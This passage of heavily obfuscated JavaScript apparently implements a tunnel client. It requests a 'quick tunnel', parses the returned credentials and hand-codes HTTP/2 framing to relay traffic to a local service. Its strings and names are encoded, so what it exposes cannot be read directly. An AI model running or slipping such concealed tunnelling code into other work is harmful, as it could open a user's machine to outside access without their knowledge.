        'BgfZDc1TB2rPzMLLza',
        'C2Tvqvq',
        'qKTgqxa',
        'z3PPCcWGzgvMBgf0zq',
        'yxjAtvy',
        'u1LoDNq',
        't09MrLC',
        'rwLAvwq',
        'BxrWq1C',
        'ENbUD3O',
        'lcbZzxqGzhvWBgLJyxrLpxrYDwuGDg8GzM9Yy2uGy3jLyxrPB24',
        'BgfZDe5LDhDVCMTuAw1L',
        'CgvLCK1HEezYyw1L',
        'tKz2wMy',
        'y29WEuzPBgvtEw5J',
        'Du9VwK8',
        'BgTyqxO',
        'l2fWAs9MAwXL',
        'BgLUAW',
        'r21zzg4',
        'Bwf4u2L6zq',
        'BwfPBG',
        'ntaY',
        's1bSB2G',
        'zwnPzxnFChvIBgLJx2TLEq',
        'wKLpyvK',
        'AgfUzhnOywTLrMLUAxnOzwq',
        'ug51Bxm',
        'zMvLza',
        'tvjKBuK',
        'mNWWFdn8nhW1Fdz8mxW4FdC',
        'zNjKB2S',
        'ic0Tls0G',
        'yMPOAve',
        'twLZC2LUzYbJAhvUAYa',
        'AgvHzgvYCW',
        'uercruu',
        'y3jLyxrLuhvIBgLJs2v5',
        'EKXqvMW',
        'CMf3sgvHzgvYCW',
        'tLnwzLe',
        'ChjVEhKTyxv0Ag9YAxPHDgLVBG',
        'svb2nG',
        'y05Az2u',
        'y0PJzgW',
        'zgvSzxrLza',
        'B3njBMzV',
        'DMLH',
        'rePZuNK',
        'mNW1Fdf8mhW2Fdr8mW',
        'qKDZEfy',
        '8j+uJcdLRQlMIlFNQ6/KUlVLIQJMLQ3LVia',
        'C3rHCNrtzxnZAw9U',
        'q3bzveu',
        'r0rkEMK',
        'q0PJq2q',
        'mtaWmduYn1DUExzmtq',
        'tMzjthK',
        'u3rHCNrPBMCGBwfPBIGPigz1BMn0Aw9UlI4U',
        'DxnL',
        'BxrICKO',
        'BhnKsK8',
        'quvtierLy3j5ChqGrxjYB3i6ia',
        'A2v5x2LK',
        'uNrPBwvVDxq',
        'w+E7IoERR+s8MUIVNsa',
        'z3nywxe',
        'AxnjBNrLz2vY',
        'u3PytwW',
        'uND3BMm',
        'q3HmsKC',
        'ywrK',
        'x2DLDfzPCNr1ywXPEMf0Aw9U',
        'zMjYC1G',
        'vNjMwgi',
        'rgvJCNLWDfDPDgHbza',
        'EuPjvvu',
        'vhDitui',
        'zMfPBgvKihrVignYzwf0zsb0Dw5UzwW6ia',
        'r1vUCfC',
        'Bg50Awu',
        'zhvWBgLJyxrL',
        'CMvWBgfJzq',
        'ic0+ideYnY4WlJaUmtO',
        'AwyTBwf0y2G',
        'rwr3uLO',
        'D2XAqLy',
        'qurUqKW',
        'wc1bDxrOlvrVA2vU',
        'BxPYCe4',
        't09MqMS',
        'z2vUzxjHDgvqywLY',
        'v2vIu29JA2v0ihjVDxrLignVBMzPz3vYzwq',
        'CMvNAxn0zxjLza',
        'qM5oCeO',
        'vfr4v00',
        'sxzoEfC',
        'DgvTCa',
        'EKHoww0',
        'DMHLDLy',
        'uhL4ueK',
        'Dvboyva',
        'twX6ANu',
        'Bg9Hza',
        'qMrjB2y',
        'icaG4OcIia',
        'vfHQzem',
        'ywXSB2m',
        'D2vIC29JA2v0',
        'BgLZDezPBgvZ',
        'wu1yDxi',
        'g1SZmw1BrKfuquWGrvjst1jDg1SWBsdOR6BNU4BPLjNOR686ia',
        'sw52ywXPzcbIAw5HCNKGC3rYzwfTihjLCxvLC3qGyM9KEq',
        'CgLWzq',
        'BujMq08',
        'BNfzvuK',
        'zgvXwge',
        'wK1Svu8',
        'z1jxvKO',
        'zxvytNa',
        's0jzD08',
        'igzHAwXLzdOG',
        'u0PZwxe',
        'Axb2nG',
        'zwnPzxnFChjPDMf0zv9RzxK',
        'zNjLzq',
        'AKfVzgS',
        'zhPcD0y',
        'ywjkq3m',
        'rMzQz0m',
        'sMjpAMy',
        'vgTos1e',
        'zxHLy3v0ywjSzq',
        'l2fWAs9MAwXLl2rVD25SB2fK',
        'sfruuc8YigzYyw1LihrVBYbSyxjNzq',
        'y3jLyxrLzef0',
        'y29UBMvJDgvKihrVia',
        'CMvSyxrPDMu',
        'uezcDgS',
        'yKzXv1e',
        'ANDR',
        'vxbNCMfKztOGD2vIC29JA2v0',
        'C2v0vte2',
        'C2v0',
        'AdiUy2z0Dw5UzwWUy29T',
        'BvnIDKW',
        'ywXSB3C',
        'y29UBMvJDgLVBIbJBg9Zzwq',
        'zxn5C1q',
        'CMvHzeHLywrLCNm',
        'Dg9cExrLqxjYyxK',
        'mc4WlJaUma',
        'Cgf0Aa',
        'EfHlyu4',
        'DhvUBMvSignVBM5Ly3rPB24GCMvNAxn0zxjLzcbHDca',
        's1zn',
        'CMvXDwvZDf9Pza',
        'z3nKz0G',
        'CuPmuee',
        'CM5bzuK',
        'vgTjEKq',
        'te5wrNe',
        'wf9psW',
        'z2v0tg9Nu3vTBwfYEq',
        't2TMCw4',
        'svnfvum',
        'Bw9Kzv9Vy3rHBa',
        'ChjVDg9JB2W',
        'y2yTy2XVDwrMBgfYzwqTCMvZCg9UC2uTBwv0yq',
        'rxvSuw8',
        'Ec1JAhvUAY1Pza',
        'ue9Mtg0',
        't3jPz2LUoIbODhrWCZOVlW',
        'Dgv4Dc9QyxzHC2nYAxb0oYbJAgfYC2v0pxv0zI04',
        '8j+uHcbBq2fJAgvDiejHC2vjBMzVioE8K+wTMow3SUI/H+ACN++8Jow3SUMhJEAwSoIWG+w6PUEZU+E7N+I1HoA6KoI/M+IHJoABToAwSooaGG',
        'Aw52ywXPzcbtrvrusu5huYbWyxLSB2fK',
        'zgLZAW',
        'BM93',
        'zMLSzxm',
        'tuPNueS',
        'rNHizvu',
        'zxHWzwn0zwrszw1VDgvqDwjcnJq',
        'sNP3ruu',
        'zfzOwuW',
        'x2LZrxHWAxjLza',
        'tLDKwMK',
        'C3rHDhvZq29Kzq',
        'lcbZCgvJAwz5ihr1BM5LBf9KB21HAw4GDg8GzgLZyw1IAwD1yxrL',
        'DxbKyxrL',
        'uvHlwxC',
        'sw5PDgLHBgL6zq',
        'y29UDgvUDc1SB2nHDgLVBG',
        'x2TLEq',
        'u2vJlvDLyLnVy2TLDc1lzxK6ia',
        'BNnxy0C',
        'nhW1Fdb8mxWYFdm',
        'yM1XruO',
        'y3rlD2K',
        'CLz4vKS',
        'vfPSEhK',
        'sfbbq0SGshvMzM1HBIbft1mGAw5ZAwrLihn0CMLUzW',
        'uw5uteO',
        'g1SZmw1Brvjst1jDg1SWBsa',
        'q29UDgvUDc1mzw5NDgG',
        'C2v0lwnVB2TPzq',
        'sxztrvq',
        'q05Hzvm',
        'D09Ws1y',
        'CMvTB3zL',
        'rvHfq19tsevmtf9nt0rf',
        'z2v0t25LDgLTzvrHC2TZ',
        'vMfSAwrHDgLUzYbJB25MAwCUlI4',
        'D0vVy0e',
        'ChjVyW',
        'Dw5RBM93BIbLCNjVCG',
        'Bwf4lwzVCNDHCMrZ',
        'zM9YrwfJAa',
        'Dhj0D0m',
        'ugDUtfK',
        'CwDTrMS',
        'icaGmI4G5OIw5Bcg5A+g6zkL5PAh5lU25Ps+5ywLic4VA2v5CY8G55UU5B2vicJOV5dOOyWGz2vUzxjHDgvFA2v5CY5WEsdNLj/MIjaP',
        'ELPesvG',
        '8j+sPsbBuMvZCg9UC2uGrw5JCNLWDf06ia',
        'Axnoyu4',
        'q0PKAMC',
        '6k6/6zEUia',
        'sfbbq0SGAw50zwDLCIb0B28GBgfYz2u',
        'vxvYD1O',
        'qwDLBNq',
        'EenHuK0',
        'y3vWEeK',
        'Aw9vEwq',
        'zwnPzxnQCW',
        'qvrJCKi',
        'l2fWAs9MAwXLl2nHDa',
        'AMPRA0W',
        'Dg9Rzw4',
        'B3DUzxi',
        'tefktNu',
        'A3zsqwe',
        'tLbLAKe',
        'x2zVCM1HDe1Vzgu',
        'AgDushm',
        'l2jPBI9ZAa',
        'D3jPDgvvsw50mtzcrq',
        'CLfmrLm',
        'zNjVBuj5DgvbCNjHEq',
        'DhvUBMvSCW',
        '4PQG77IpienVBLbuwsdLKk/LIQJLPlhOTkxVViZLM57PGidNRQhPGzpMQkhLVi86ia',
        'Aw5PDa',
        'sMj3Bgy',
        'AeXPthi',
        'BhzOEeq',
        '8j+qMIdKVB/NLkGGu2HLBgWG6lEV5B6eoIa',
        'CfbYEgW',
        'y2z0Dw5UzwWUANmVms4W',
        'D0fjzMq',
        'CMvHzfvjBNqZmKXf',
        'B0Xit3m',
        'rwDIAe0',
        'q3jLyxrPBMCGrxHWCMvZCYbHChaUlI4',
        'DNPgqKW',
        'u0Lhsu5uigHHBMrSzxiGCMvNAxn0zxjLza',
        'sw5PDgLHBgL6Aw5NifrLBxblzxLnyw5Hz2vYlI4U',
        'zxHWCMvZCY13CW',
        'ntaW',
        'yKLYvKO',
        'rKXWsee',
        'zxjYB3jLza',
        'CMvHzfvjBNqXnKjf',
        'zgvJB2rL',
        'l3bYB2mVy3b1Aw5MBW',
        'C2v0qxv0AfrHzW',
        'qvzAEei',
        'yMfxy1y',
        'Dw5KzwzPBMvK',
        'D3jPDgvcExrLCW',
        'CMfT',
        'BxPOvvG',
        'AgfUzhnOywTL',
        '4P2mioMfJEE9RUAGOEMQJowKSEI0PsaO6z2ErevcvuFMQkhLVi/LV4xPOBVPHy3NVA7LR4BPKQuPoG',
        'CejbugS',
        'vMzZAg4',
        'C2HLBgW',
        'Cu5cu2K',
        'r0vulcbqt1nulcbqvvqSierftevursWGt1busu9ouW',
        't0zHCLG',
        'BM90x2zVDw5K',
        'BwfW',
        'ChjVEhLszxf1zxn0',
        'yw5LvLi',
        'zgvSzxrLrMLSzxm',
        't3LQDuS',
        'shjxywW',
        'y21KihjLCxvPCMvK',
        'g1S5mg1BrevcvuDDg1SWBsa',
        'rxHWCMvZCYbHChaGy3jLyxrLzcbHBMqGzxHWCMvZC1DZigfWCgXPzwq',
        'zvnYvee',
        't1bftG',
        'rLbcB24',
        'tMv4DxmTuhL0Ag9U',
        'uuvnvq',
        'tg9ZCg0',
        'wNbHqvm',
        'z2v0qwn0AxzLrwnKC2fwAW',
        'y29WEuzPBgvZ',
        'C2vJlxDLyNnVy2TLDc1Hy2nLChq',
        'y29UBMvJDa',
        'y291BNq',
        'l2jPBI9HC2G',
        'tu1oB3u',
        'rg9JA2vY',
        'DxPZt3e',
        'q29UDhjVBgXLCG',
        's3vIzxjUzxrLCW',
        'z2v0tg9JywXjuhy0',
        'DhvUBMvSrg9TywLU',
        'DgnW',
        'z2LK',
        'AhzdsNy',
        'C3DHChvZzwq',
        'BKXRvwy',
        'x3DHAxrxAw5KB3C',
        'ignVBM5Ly3rPB24Gy2XVC2vKoIa',
        'C3rYzwfTia',
        'Dg90ywXozxr3B3jRrg93BG',
        'z2v0t25LDgLTzuXVz3m',
        'BLf6uee',
        'BgzNr3u',
        'AgfUzgXLrgf0yq',
        'AePbree',
        'qxPbu2O',
        'iowWJ+AxTG',
        'D3jPDgfIBgu',
        'y29UDgvUDc1KAxnWB3nPDgLVBG',
        'Dgv4Dc9JC3m7ignOyxjZzxq9DxrMltG',
        'v09kBgq',
        'zxHWzwn0zwqGq2fWj24GuhjVDg8GC3rYDwn0ihbVAw50zxi',
        'zur0Ceq',
        'AMTdug4',
        'x29UrxHPDenI',
        'DgzYCNG',
        'wKP1rwe',
        'zMLUAxnO',
        'z2v0uhvIBgLJs2v5',
        'CwHtu08',
        'AwyTBw9KAwzPzwqTC2LUy2u',
        'l2jPBI9IyxnO',
        'AwyTDw5TB2rPzMLLzc1ZAw5Jzq',
        'u1rTyu4'
    ];
    a0a = function () {
        return f3;
    };
    return a0a();
}
function a0al(a) {
    const cD = a0aI, b = {
            'eqWPG': cD(0xd9),
            'fWPrL': function (c, d) {
                return c(d);
            },
            'eWypC': function (c, d) {
                return c + d;
            },
            'MRdmI': function (c, d) {
                return c + d;
            },
            'gsdgH': cD(0x1c2),
            'GZYCa': cD(0x6c6),
            'SJsYq': cD(0x2f0),
            'knThT': function (c, d) {
                return c !== d;
            },
            'IOHWV': 'string',
            'CofrY': cD(0x5f1),
            'cWYdt': cD(0x386),
            'MtkEM': cD(0xd8),
            'trtwC': cD(0xdc),
            'nuJoI': cD(0x3c8),
            'dgzju': cD(0x314),
            'PszUe': function (c, d) {
                return c + d;
            },
            'fxzWC': cD(0xf8),
            'RGCRY': function (c, d) {
                return c === d;
            },
            'MhNGf': cD(0x2d0),
            'euKPI': cD(0xfb),
            'MybaL': cD(0x338),
            'MRYIJ': cD(0x591)
        };
    return new Promise((c, d) => {
        const cE = cD;
        let f;
        try {
            f = new URL(a[cE(0x4e4)](/\/+$/, '') + b[cE(0x268)]);
        } catch (i) {
            b['fWPrL'](d, new Error(b['PszUe'](b['fxzWC'], i['message'])));
            return;
        }
        const g = b[cE(0x195)](f[cE(0x539)], b[cE(0x387)]) ? a0h : a0g, h = g['request'](f, {
                'method': b['euKPI'],
                'headers': {
                    'Content-Type': b[cE(0x241)],
                    'User-Agent': b[cE(0x305)]
                },
                'timeout': 0x3a98
            }, j => {
                const cF = cE, k = {
                        'odaVz': b[cF(0x1cc)],
                        'jrwyH': function (m, n) {
                            const cG = cF;
                            return b[cG(0x319)](m, n);
                        },
                        'lmGBT': function (m, n) {
                            return b['eWypC'](m, n);
                        },
                        'zEADL': function (m, n) {
                            const cH = cF;
                            return b[cH(0x4af)](m, n);
                        },
                        'SaBFx': b[cF(0x52f)],
                        'fNTvq': b[cF(0x282)],
                        'vqGzJ': b[cF(0x50c)],
                        'SYNvt': function (m, n) {
                            return m !== n;
                        },
                        'jpLrx': function (m, n) {
                            const cI = cF;
                            return b[cI(0x3c6)](m, n);
                        },
                        'CpJEY': b['IOHWV'],
                        'uXQaq': b[cF(0x236)],
                        'HERDq': b[cF(0x478)],
                        'jBsck': function (m, n) {
                            const cJ = cF;
                            return b[cJ(0x319)](m, n);
                        },
                        'IvNxW': b[cF(0x433)]
                    }, l = [];
                j['on'](cF(0x2eb), m => l[cF(0x6aa)](m)), j['on'](b['trtwC'], d), j['on'](b[cF(0x1c4)], () => {
                    const cK = cF, m = Buffer[cK(0x1c8)](l), n = j['statusCode'];
                    let o;
                    try {
                        o = JSON['parse'](m[cK(0x406)](k['odaVz']));
                    } catch (q) {
                        k[cK(0x2dc)](d, new Error(k['lmGBT'](k['zEADL'](k['zEADL'](k[cK(0x222)], n), k['fNTvq']), m[cK(0xfa)](0x0, 0x12c)['toString'](k['odaVz']))));
                        return;
                    }
                    const p = o[cK(0x24e)] || {};
                    if (!(o[cK(0x336)] ?? !![]) || !p) {
                        d(new Error('quick\x20tunnel\x20request\x20was\x20rejected:\x20' + JSON[cK(0x1f1)](o[cK(0x2fd)])));
                        return;
                    }
                    try {
                        const r = k[cK(0x2dc)](String, p['id']);
                        if (!a0ak[cK(0x67c)](r))
                            throw new Error(k['vqGzJ']);
                        if (k[cK(0x497)](typeof p[cK(0x281)], cK(0x450)) || k[cK(0x444)](typeof p['hostname'], k[cK(0x419)]))
                            throw new Error(k[cK(0x376)]);
                        const s = k['jrwyH'](a0aj, p[cK(0x22e)]), t = Buffer[cK(0x613)](r[cK(0x4e4)](/-/g, ''), k[cK(0x3a4)]);
                        k[cK(0x2dc)](c, [
                            p[cK(0x471)],
                            p[cK(0x281)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        k[cK(0xfd)](d, new Error(k[cK(0x4f2)] + u['message']));
                    }
                });
            });
        h['on'](b[cE(0x56b)], j => d(new Error(cE(0xf8) + j[cE(0x3f8)]))), h['end']();
    });
}
function a0am(a) {
    const cL = a0aI;
    return a[cL(0x5b2)](([b, c]) => Buffer[cL(0x613)](b, cL(0xd9))[cL(0x406)](cL(0x68a))['replace'](/=+$/, '') + ':' + Buffer[cL(0x613)](c, cL(0xd9))[cL(0x406)](cL(0x68a))[cL(0x4e4)](/=+$/, ''))[cL(0x64a)](';');
}
class a0an {
    constructor(a) {
        const cM = a0aI, b = {
                'qUhBR': cM(0x4b0),
                'aphhL': 'error',
                'WwBSf': cM(0x2eb),
                'CJdjg': cM(0x107),
                'OqMzJ': cM(0x3c8)
            }, c = b['qUhBR'][cM(0x67f)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this['buffer'] = Buffer['alloc'](0x0);
                continue;
            case '1':
                a['on'](b[cM(0x1a0)], f => {
                    this['errored'] = f, this['_drain']();
                });
                continue;
            case '2':
                this['socket'] = a;
                continue;
            case '3':
                this[cM(0x235)] = [];
                continue;
            case '4':
                this['errored'] = null;
                continue;
            case '5':
                this[cM(0x3b1)] = ![];
                continue;
            case '6':
                a['on'](b[cM(0x135)], f => {
                    const cN = cM;
                    this[cN(0x2de)] = this['buffer'][cN(0x3d0)] ? Buffer[cN(0x1c8)]([
                        this['buffer'],
                        f
                    ]) : f, this[cN(0x345)]();
                });
                continue;
            case '7':
                a['on'](b[cM(0x572)], () => {
                    const cO = cM;
                    this['closed'] = !![], this[cO(0x345)]();
                });
                continue;
            case '8':
                a['on'](b[cM(0x6e0)], () => {
                    const cP = cM;
                    this[cP(0x3b1)] = !![], this[cP(0x345)]();
                });
                continue;
            }
            break;
        }
    }
    [a0aI(0x345)]() {
        const cQ = a0aI, a = {
                'MXRcP': function (b, c) {
                    return b > c;
                },
                'gxZth': function (b, c) {
                    return b !== c;
                },
                'kOfKh': 'connection\x20closed'
            };
        while (a['MXRcP'](this[cQ(0x235)]['length'], 0x0)) {
            const b = this[cQ(0x235)][0x0];
            if (this[cQ(0x2de)][cQ(0x3d0)] >= b[cQ(0xcd)]) {
                this[cQ(0x235)][cQ(0x22f)]();
                const c = this[cQ(0x2de)][cQ(0xfa)](0x0, b[cQ(0xcd)]);
                this['buffer'] = this[cQ(0x2de)][cQ(0xfa)](b[cQ(0xcd)]), b[cQ(0x363)](c);
            } else {
                if (a['gxZth'](this[cQ(0x59e)], null))
                    this['waiters']['shift'](), b['reject'](this[cQ(0x59e)]);
                else {
                    if (this[cQ(0x3b1)])
                        this[cQ(0x235)]['shift'](), b['reject'](new Error(a['kOfKh']));
                    else
                        break;
                }
            }
        }
    }
    [a0aI(0x19f)](a) {
        const cR = a0aI, b = {
                'NhGto': function (c, d) {
                    return c !== d;
                },
                'huIcj': function (c, d) {
                    return c >= d;
                },
                'FAqDT': cR(0x525)
            };
        if (b[cR(0xcc)](this[cR(0x59e)], null))
            return Promise[cR(0x627)](this[cR(0x59e)]);
        if (b['huIcj'](this[cR(0x2de)]['length'], a)) {
            const c = this['buffer'][cR(0xfa)](0x0, a);
            return this[cR(0x2de)] = this[cR(0x2de)]['subarray'](a), Promise[cR(0x363)](c);
        }
        if (this[cR(0x3b1)])
            return Promise[cR(0x627)](new Error(b['FAqDT']));
        return new Promise((d, f) => {
            const cS = cR;
            this[cS(0x235)][cS(0x6aa)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[cS(0x345)]();
        });
    }
}
class a0ao {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const cT = a0aI, l = {
                'wSovA': cT(0x105),
                'wLWwN': function (o, p) {
                    return o || p;
                }
            }, m = l[cT(0x44d)][cT(0x67f)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this[cT(0x2ba)] = null;
                continue;
            case '1':
                this[cT(0x6ce)] = h;
                continue;
            case '2':
                this[cT(0x64e)] = g;
                continue;
            case '3':
                this[cT(0x66d)] = j;
                continue;
            case '4':
                this[cT(0x4ef)] = ![];
                continue;
            case '5':
                this[cT(0x49e)] = a0X;
                continue;
            case '6':
                this['reader'] = new a0an(a);
                continue;
            case '7':
                this['tunnelState'] = l['wLWwN'](k, { 'printed': ![] });
                continue;
            case '8':
                this[cT(0x48f)] = d;
                continue;
            case '9':
                this['tunnelUrl'] = i;
                continue;
            case '10':
                this[cT(0x3be)] = new Map();
                continue;
            case '11':
                this['stopped'] = ![];
                continue;
            case '12':
                this[cT(0x393)] = new Map();
                continue;
            case '13':
                this[cT(0x477)] = c;
                continue;
            case '14':
                this[cT(0x1ae)] = [];
                continue;
            case '15':
                this[cT(0x6db)] = f;
                continue;
            case '16':
                this[cT(0x3cc)] = new a0a6();
                continue;
            case '17':
                this[cT(0x422)] = b;
                continue;
            case '18':
                this[cT(0x37c)] = a;
                continue;
            case '19':
                this[cT(0x6b3)] = 0xffff;
                continue;
            }
            break;
        }
    }
    [a0aI(0x250)](a, b, c, d = Buffer['alloc'](0x0)) {
        const cU = a0aI, f = {
                'BEarb': function (h, i) {
                    return h > i;
                },
                'Fbofc': cU(0x518),
                'anFUK': function (h, i) {
                    return h & i;
                }
            };
        if (f['BEarb'](d[cU(0x3d0)], 0xffffff))
            throw new Error(f[cU(0xea)]);
        const g = Buffer[cU(0x4fd)](0x9);
        g['writeUIntBE'](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[cU(0x3b2)](f[cU(0x347)](c, 0x7fffffff), 0x5), this[cU(0x37c)][cU(0x19e)](Buffer[cU(0x1c8)]([
            g,
            d
        ]));
    }
    [a0aI(0x1fd)](a, b, c = ![]) {
        const cV = a0aI, d = {
                'qYTla': function (h, i) {
                    return h(i);
                }
            }, f = d['qYTla'](a0a9, b), g = 0x4 | (c ? 0x1 : 0x0);
        this[cV(0x250)](0x1, g, a, f);
    }
    [a0aI(0x5d4)](a) {
        const cW = a0aI, b = {
                'TNcPD': function (c, d) {
                    return c > d;
                },
                'Kwxrz': function (c, d) {
                    return c > d;
                }
            };
        if (b[cW(0x114)](this[cW(0x6b3)], 0x0) && b['Kwxrz'](this[cW(0x3be)][cW(0x327)](a) ?? 0xffff, 0x0))
            return Promise[cW(0x363)]();
        return new Promise(c => {
            this['windowWaiters']['push']({
                'streamId': a,
                'resolve': c
            });
        });
    }
    ['_notifyWindows']() {
        const cX = a0aI, a = {
                'TsMhx': function (c, d) {
                    return c > d;
                },
                'KPEAN': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this['windowWaiters']) {
            const d = this[cX(0x3be)]['get'](c['streamId']) ?? 0xffff;
            a[cX(0x615)](this['connectionWindow'], 0x0) && a[cX(0x43c)](d, 0x0) ? c[cX(0x363)]() : b[cX(0x6aa)](c);
        }
        this[cX(0x1ae)] = b;
    }
    [a0aI(0x48d)]() {
        const cY = a0aI;
        for (const a of this[cY(0x1ae)]) {
            a['resolve']();
        }
        this[cY(0x1ae)] = [];
    }
    async ['sendData'](a, b, c = ![]) {
        const cZ = a0aI, d = {
                'vTkuy': function (h, i) {
                    return h - i;
                },
                'QPJta': function (h, i) {
                    return h >= i;
                },
                'xXKaN': function (h, i) {
                    return h + i;
                },
                'qNBSi': function (h, i) {
                    return h - i;
                },
                'AdYNV': function (h, i) {
                    return h < i;
                }
            }, f = b[cZ(0x3d0)];
        let g = 0x0;
        do {
            await this['_waitWindow'](a);
            if (this[cZ(0x286)])
                return;
            const h = this[cZ(0x3be)][cZ(0x327)](a) ?? 0xffff, i = Math[cZ(0x3c1)](d[cZ(0x2da)](f, g), this[cZ(0x6b3)], h, this[cZ(0x49e)]), j = c && d[cZ(0x26e)](d['xXKaN'](g, i), f) ? 0x1 : 0x0, k = b[cZ(0xfa)](g, d[cZ(0x52b)](g, i));
            this[cZ(0x6b3)] -= i, this[cZ(0x3be)][cZ(0x521)](a, d[cZ(0x5ae)](h, i)), this['sendFrame'](0x0, j, a, k), g += i;
        } while (d['AdYNV'](g, f));
    }
    [a0aI(0x45d)](a, b) {
        const d0 = a0aI, c = {
                'xCaRM': function (d, f) {
                    return d > f;
                },
                'WTJwm': function (d, f) {
                    return d & f;
                }
            };
        if (c[d0(0x577)](b, 0x0)) {
            const d = Buffer[d0(0x4fd)](0x4);
            d[d0(0x3b2)](c[d0(0x2f5)](b, 0x7fffffff), 0x0), this[d0(0x250)](0x8, 0x0, a, d);
        }
    }
    async [a0aI(0x38c)]() {
        const d1 = a0aI, a = {
                'yQuOf': function (i, j) {
                    return i & j;
                }
            }, b = await this[d1(0x22a)][d1(0x19f)](0x9), c = b[d1(0xcf)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a['yQuOf'](b[d1(0x14a)](0x5), 0x7fffffff), h = await this[d1(0x22a)][d1(0x19f)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aI(0x527)](a, b, c) {
        const d2 = a0aI, d = {
                'uHDNX': function (g, h) {
                    return g & h;
                },
                'mcqDk': 'invalid\x20HTTP/2\x20padding',
                'YroiB': function (g, h) {
                    return g - h;
                },
                'fxtMB': function (g, h) {
                    return g & h;
                },
                'RjXOp': function (g, h) {
                    return g !== h;
                },
                'xrKGf': function (g, h) {
                    return g !== h;
                },
                'RLUtK': d2(0x686)
            };
        if (d['uHDNX'](a, 0x8)) {
            const g = c[0x0];
            c = c[d2(0xfa)](0x1);
            if (g > c[d2(0x3d0)])
                throw new Error(d['mcqDk']);
            c = g ? c[d2(0xfa)](0x0, d[d2(0x30a)](c[d2(0x3d0)], g)) : c;
        }
        a & 0x20 && (c = c[d2(0xfa)](0x5));
        const f = [c];
        while (!d[d2(0x629)](a, 0x4)) {
            const h = await this['readFrame']();
            if (d[d2(0x614)](h[0x0], 0x9) || d['xrKGf'](h[0x2], b))
                throw new Error(d[d2(0x45a)]);
            f[d2(0x6aa)](h[0x3]), a = h[0x1];
        }
        return this[d2(0x3cc)][d2(0x5a0)](Buffer[d2(0x1c8)](f));
    }
    [a0aI(0x47a)](a) {
        const d3 = a0aI, b = {
                'FLIHa': function (c, d) {
                    return c !== d;
                },
                'mYjpa': d3(0x617),
                'tRpNh': d3(0x1e7)
            };
        if (b['FLIHa'](this['control'], null))
            return;
        this[d3(0x2ba)] = new a0aq(this, a, this['log']), this[d3(0x1fd)](a, [[
                b[d3(0x2ed)],
                b[d3(0x667)]
            ]]), this[d3(0x2ba)]['start'](this['accountTag'], this[d3(0x48f)], this[d3(0x6db)], this[d3(0x64e)]);
    }
    [a0aI(0x3ec)](a, b) {
        const d4 = a0aI, c = {
                'EmOco': d4(0xd9),
                'mxmnP': function (g, h, i) {
                    return g(h, i);
                },
                'XKJRY': d4(0x617),
                'Pejsq': d4(0x1e7),
                'RcpRT': 'content-type',
                'OAkts': 'application/json',
                'nSlln': 'content-length',
                'VjmGH': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON['parse'](b[d4(0x3d0)] ? b['toString'](c[d4(0x17d)]) : '{}'), h = c[d4(0x6cb)](parseInt, g[d4(0x600)], 0xa);
            !Number[d4(0x571)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[d4(0x613)](JSON['stringify']({ 'latestAppliedVersion': d }));
        this[d4(0x1fd)](a, [
            [
                c[d4(0x637)],
                c['Pejsq']
            ],
            [
                c[d4(0x16b)],
                c[d4(0x6b0)]
            ],
            [
                c['nSlln'],
                c[d4(0x6c8)](String, f['length'])
            ]
        ]), this[d4(0x2e5)](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const d5 = a0aI, c = d5(0x6de)['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                b[d5(0x3cb)] = !![];
                continue;
            case '1':
                if (b['finished'])
                    return;
                continue;
            case '2':
                if (b[d5(0x29e)] === d5(0x451)) {
                    this[d5(0x3ec)](a, Buffer[d5(0x1c8)](b[d5(0x42a)]));
                    return;
                }
                continue;
            case '3':
                this[d5(0x5b3)](a, b)[d5(0x5fd)](() => {
                });
                continue;
            case '4':
                if (b[d5(0x4fe)])
                    return;
                continue;
            }
            break;
        }
    }
    async [a0aI(0x5b3)](a, b) {
        const d6 = a0aI, c = {
                'YBErC': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'NYvYH': function (d, f) {
                    return d === f;
                },
                'CAhZn': d6(0x64d),
                'RqAyM': d6(0x24d),
                'IiLgn': d6(0x371),
                'YMXur': function (d, f) {
                    return d === f;
                },
                'QESsk': d6(0x5c4),
                'QibSZ': function (d, f) {
                    return d(f);
                },
                'sjFtn': 'content-type',
                'QSquP': function (d, f) {
                    return d(f);
                },
                'nrlIS': function (d, f) {
                    return d === f;
                },
                'NJdVm': d6(0x617),
                'PDBEE': d6(0x53a),
                'wXQHH': d6(0x1c3),
                'XLjPM': function (d, f) {
                    return d + f;
                },
                'oqPeA': function (d, f) {
                    return d + f;
                },
                'EKGra': d6(0x5d6),
                'ADDqA': d6(0x2c4),
                'hdjyL': d6(0x4a8)
            };
        try {
            const d = await c['YBErC'](a0at, this[d6(0x422)], b[d6(0x193)], b[d6(0x52a)], b[d6(0x4b5)], Buffer[d6(0x1c8)](b[d6(0x42a)])), f = [], g = [];
            for (const [k, l] of d[d6(0x4b5)]) {
                const m = k[d6(0x43b)]();
                c[d6(0x2b5)](m, c[d6(0x648)]) && g[d6(0x6aa)]([
                    m,
                    l
                ]);
                const n = m['startsWith'](d6(0x6a6)) || m[d6(0x1bd)](c[d6(0x675)]) || m[d6(0x1bd)](c['IiLgn']) || m['startsWith'](':');
                (!n || c[d6(0x500)](m, d6(0x413)) || c[d6(0x2b5)](m, d6(0x29e)) || c[d6(0x2b5)](m, c[d6(0x221)])) && f[d6(0x6aa)]([
                    m,
                    l
                ]);
            }
            if (!f[d6(0x204)](([o]) => o === d6(0x1ee))) {
                const o = c[d6(0x1fa)](a0ai, b[d6(0x52a)]);
                o && f[d6(0x6aa)]([
                    c[d6(0x23a)],
                    o
                ]);
            }
            const h = c[d6(0x2bd)](a0am, f), i = c[d6(0x340)](d[d6(0x609)], 0x65) ? 0xc8 : d[d6(0x609)], j = [
                    [
                        c[d6(0x6b2)],
                        String(i)
                    ],
                    ...g,
                    [
                        d6(0x66b),
                        h
                    ],
                    [
